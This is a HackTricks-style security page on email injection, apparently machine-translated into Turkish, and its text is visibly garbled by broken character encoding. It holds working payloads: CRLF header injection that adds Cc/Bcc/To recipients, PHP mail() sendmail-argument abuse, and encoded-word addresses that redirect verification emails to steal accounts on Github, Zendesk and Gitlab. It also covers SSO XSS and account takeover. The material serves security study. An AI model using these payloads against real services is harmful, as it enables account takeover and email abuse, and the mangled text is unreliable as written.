# Email Injections

{{#include ../banners/hacktricks-training.md}}

## GÃ¶nderilen e-postaya Enjekte Et

### GÃ¶nderen argÃ¼manÄ±ndan sonra Cc ve Bcc Enjekte Et
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Mesaj, alÄ±cÄ± ve alÄ±cÄ±1 hesaplarÄ±na gÃ¶nderilecektir.

### Enjekte argÃ¼manÄ±
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Mesaj, orijinal alÄ±cÄ±ya ve saldÄ±rgan hesabÄ±na gÃ¶nderilecektir.

### Subject argÃ¼manÄ±nÄ± Enjekte Et
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
Sahte konu, orijinal konuya eklenecek ve bazÄ± durumlarda onu deÄŸiÅŸtirecektir. Bu, mail hizmetinin davranÄ±ÅŸÄ±na baÄŸlÄ±dÄ±r.

### MesajÄ±n gÃ¶vdesini deÄŸiÅŸtir

Ä°ki satÄ±r besleme enjekte edin, ardÄ±ndan mesajÄ±n gÃ¶vdesini deÄŸiÅŸtirmek iÃ§in mesajÄ±nÄ±zÄ± yazÄ±n.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() fonksiyonu istismarÄ±
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### 5. parametre ($additional_parameters)

Bu bÃ¶lÃ¼m, **bir saldÄ±rganÄ±n bu parametreyi kontrol ettiÄŸini varsayarak bu parametreyi nasÄ±l kÃ¶tÃ¼ye kullanacaÄŸÄ±mÄ±za** dayanacaktÄ±r.

Bu parametre, PHP'nin ikili sendmail'i Ã§aÄŸÄ±rmak iÃ§in kullanacaÄŸÄ± komut satÄ±rÄ±na eklenecektir. Ancak, `escapeshellcmd($additional_parameters)` fonksiyonu ile temizlenecektir.

Bir saldÄ±rgan, bu durumda **sendmail iÃ§in ek parametreler enjekte edebilir**.

#### /usr/sbin/sendmail uygulamasÄ±ndaki farklÄ±lÄ±klar

**sendmail** arayÃ¼zÃ¼, sistemde kurulu olan MTA e-posta yazÄ±lÄ±mÄ± (Sendmail, Postfix, Exim vb.) tarafÄ±ndan **saÄŸlanmaktadÄ±r**. **Temel iÅŸlevsellik** (Ã¶rneÄŸin -t -i -f parametreleri) uyumluluk nedenleriyle **aynÄ±** kalÄ±rken, **diÄŸer iÅŸlevler ve parametreler** kurulu MTA'ya baÄŸlÄ± olarak bÃ¼yÃ¼k Ã¶lÃ§Ã¼de deÄŸiÅŸiklik gÃ¶stermektedir.

Ä°ÅŸte sendmail komutu/arayÃ¼zÃ¼nÃ¼n farklÄ± man sayfalarÄ±na birkaÃ§ Ã¶rnek:

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

**sendmail** ikilisinin kÃ¶kenine baÄŸlÄ± olarak, bunlarÄ± kÃ¶tÃ¼ye kullanmak ve **dosyalarÄ± sÄ±zdÄ±rmak veya hatta rastgele komutlar Ã§alÄ±ÅŸtÄ±rmak** iÃ§in farklÄ± seÃ§enekler keÅŸfedilmiÅŸtir. NasÄ±l olduÄŸunu kontrol edin [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## E-posta adÄ±nda enjekte et

> [!CAUTION]
> EÄŸer rastgele bir alan adÄ±yla (Github, Gitlab, CloudFlare Zero trust gibi) bir hizmette hesap oluÅŸturmayÄ± baÅŸarÄ±r ve doÄŸrulama e-postasÄ±nÄ± alarak bunu doÄŸrularsanÄ±z, kurban ÅŸirketin hassas alanlarÄ±na eriÅŸim saÄŸlayabilirsiniz.

### Bir e-postanÄ±n gÃ¶z ardÄ± edilen kÄ±sÄ±mlarÄ±

**+, -** ve **{}** sembolleri nadir durumlarda etiketleme iÃ§in kullanÄ±labilir ve Ã§oÄŸu e-posta sunucusu tarafÄ±ndan gÃ¶z ardÄ± edilir.

- Ã–r. john.doe+intigriti@example.com â†’ john.doe@example.com

**Parantez iÃ§indeki yorumlar ()** baÅŸlangÄ±Ã§ta veya sonunda da gÃ¶z ardÄ± edilecektir.

- Ã–r. john.doe(intigriti)@example.com â†’ john.doe@example.com

### Beyaz listeyi atlama

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### AlÄ±ntÄ±lar

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP'ler

AyrÄ±ca, kÃ¶ÅŸeli parantezler arasÄ±nda alan adÄ± olarak IP'ler de kullanabilirsiniz:

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### E-posta KodlamasÄ±

[**bu araÅŸtÄ±rmada**](https://portswigger.net/research/splitting-the-email-atom) aÃ§Ä±klandÄ±ÄŸÄ± gibi, e-posta adlarÄ± da kodlanmÄ±ÅŸ karakterler iÃ§erebilir:

- **PHP 256 taÅŸmasÄ±**: PHP `chr` fonksiyonu, bir karaktere 256 eklemeye devam eder, pozitif hale geldiÄŸinde `%256` iÅŸlemini yapar.
- `String.fromCodePoint(0x10000 + 0x40) // ğ€ â†’ @`

> [!TIP]
> Bu numaranÄ±n amacÄ±, `RCPT TO:<"collab@psres.net>collab"@example.com>` gibi bir enjekte ile sonuÃ§lanmaktÄ±r.\
> Bu, doÄŸrulama e-postasÄ±nÄ± beklenen e-posta adresinden farklÄ± bir e-posta adresine gÃ¶nderecektir (bu nedenle e-posta adÄ±nÄ±n iÃ§ine baÅŸka bir e-posta adresi eklemek ve e-postayÄ± gÃ¶nderirken sÃ¶zdizimini bozmak).

FarklÄ± kodlamalar:
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#Â iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 â†’ x@<svg/
```
Payloadlar:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- KodlanmÄ±ÅŸ `@` iÅŸaretine =40, kodlanmÄ±ÅŸ `>` iÅŸaretine `=3e` ve `null` deÄŸerine `=00` olarak dikkat edin.&#x20;
- DoÄŸrulama e-postasÄ± `collab@psres.net` adresine gÃ¶nderilecektir.
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- Ã–nceki hileyle aynÄ± ama baÅŸÄ±na bazÄ± normal tÄ±rnak ekleyerek ve kodlanmÄ±ÅŸ tÄ±rnak `=22` ekleyerek kodlanmÄ±ÅŸ `@` iÅŸaretinden Ã¶nce ve ardÄ±ndan bir sonraki e-posta iÃ§in bazÄ± tÄ±rnaklarÄ± aÃ§Ä±p kapatarak Zendesk'in dahili olarak kullandÄ±ÄŸÄ± sÃ¶zdizimini dÃ¼zeltir.
- DoÄŸrulama e-postasÄ± `collab@psres.net` adresine gÃ¶nderilecektir.
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- Adresi ayÄ±rmak iÃ§in alt Ã§izgi kullanÄ±mÄ±na dikkat edin.
- DoÄŸrulama e-postasÄ± `collab@psres.net` adresine gÃ¶nderilecektir.
- Punycode: Punycode kullanarak Joomla'da `<style` etiketi enjekte etmek ve bunu CSRF token'Ä±nÄ± CSS dÄ±ÅŸa aktarÄ±mÄ± yoluyla Ã§almak iÃ§in kÃ¶tÃ¼ye kullanmak mÃ¼mkÃ¼ndÃ¼.

#### AraÃ§lar

- Bu tÃ¼r kombinasyonlarÄ± denemek iÃ§in e-posta formatlarÄ±na saldÄ±rmak amacÄ±yla **Burp Suite Turbo Intruder scripti** bulunmaktadÄ±r. Script, potansiyel olarak Ã§alÄ±ÅŸan kombinasyonlara sahiptir.
- AyrÄ±ca [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) kullanarak bir e-posta bÃ¶lme saldÄ±rÄ±sÄ± oluÅŸturmak da mÃ¼mkÃ¼ndÃ¼r.

### DiÄŸer zafiyetler

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## ÃœÃ§Ã¼ncÃ¼ taraf SSO

### XSS

**github** veya **salesforce** gibi bazÄ± hizmetler, Ã¼zerinde **XSS yÃ¼kleri bulunan bir e-posta adresi oluÅŸturmanÄ±za** izin verir. EÄŸer bu saÄŸlayÄ±cÄ±larÄ± **diÄŸer hizmetlere giriÅŸ yapmak iÃ§in kullanabiliyorsanÄ±z** ve bu hizmetler e-postayÄ± **doÄŸru bir ÅŸekilde temizlemiyorsa**, **XSS** oluÅŸturabilirsiniz.

### Hesap Ele GeÃ§irme

EÄŸer bir **SSO hizmeti**, **verilen e-posta adresini doÄŸrulamadan bir hesap oluÅŸturmanÄ±za** izin veriyorsa (Ã¶rneÄŸin **salesforce**) ve ardÄ±ndan bu hesabÄ± **farklÄ± bir hizmette** kullanabiliyorsanÄ±z ve bu hizmet **salesforce'a gÃ¼veniyorsa**, herhangi bir hesaba eriÅŸebilirsiniz.\
&#xNAN;_&#x4E;ote that salesforce verilen e-postanÄ±n doÄŸrulanÄ±p doÄŸrulanmadÄ±ÄŸÄ±nÄ± belirtir, ancak uygulama bu bilgiyi dikkate almalÄ±dÄ±r._

## YanÄ±tla

_E-posta gÃ¶nderirken _**From: company.com**_ ve _**Replay-To: attacker.com**_ kullanabilirsiniz ve e-posta **iÃ§sel bir adresten** gÃ¶nderildiÄŸi iÃ§in herhangi bir **otomatik yanÄ±t** gÃ¶nderilirse, **saldÄ±rgan** bu **yanÄ±tÄ±** **alabilir**.

## Sert Ä°ade OranÄ±

AWS gibi belirli hizmetler, genellikle %10 olarak ayarlanan **Sert Ä°ade OranÄ±** olarak bilinen bir eÅŸik uygular. Bu, Ã¶zellikle e-posta teslimat hizmetleri iÃ§in kritik bir metriktir. Bu oran aÅŸÄ±ldÄ±ÄŸÄ±nda, AWS'nin e-posta hizmeti gibi hizmetler askÄ±ya alÄ±nabilir veya engellenebilir.

**Sert iade**, alÄ±cÄ±nÄ±n adresinin geÃ§ersiz veya mevcut olmadÄ±ÄŸÄ± iÃ§in gÃ¶nderenine geri dÃ¶nen bir **e-posta** anlamÄ±na gelir. Bu, e-postanÄ±n mevcut olmayan bir adrese, gerÃ§ek olmayan bir alan adÄ±na veya alÄ±cÄ± sunucusunun **e-postalarÄ±** kabul etmeyi reddetmesi gibi Ã§eÅŸitli nedenlerden kaynaklanabilir.

AWS baÄŸlamÄ±nda, 1000 e-posta gÃ¶nderdiÄŸinizde ve bunlardan 100'Ã¼ sert iadelerle sonuÃ§landÄ±ÄŸÄ±nda (geÃ§ersiz adresler veya alanlar gibi nedenlerden dolayÄ±), bu %10 sert iade oranÄ± anlamÄ±na gelir. Bu orana ulaÅŸmak veya aÅŸmak, AWS SES (Basit E-posta Servisi) tarafÄ±ndan e-posta gÃ¶nderme yeteneklerinizin engellenmesine veya askÄ±ya alÄ±nmasÄ±na neden olabilir.

Kesintisiz e-posta hizmeti saÄŸlamak ve gÃ¶nderen itibarÄ±nÄ± korumak iÃ§in dÃ¼ÅŸÃ¼k bir sert iade oranÄ±nÄ± sÃ¼rdÃ¼rmek kritik Ã¶neme sahiptir. E-posta listelerinizdeki e-posta adreslerinin kalitesini izlemek ve yÃ¶netmek, bunu baÅŸarmada Ã¶nemli Ã¶lÃ§Ã¼de yardÄ±mcÄ± olabilir.

Daha ayrÄ±ntÄ±lÄ± bilgi iÃ§in, AWS'nin iade ve ÅŸikayetleri ele alma konusundaki resmi belgelerine [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types) baÅŸvurabilirsiniz.

## Referanslar

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}
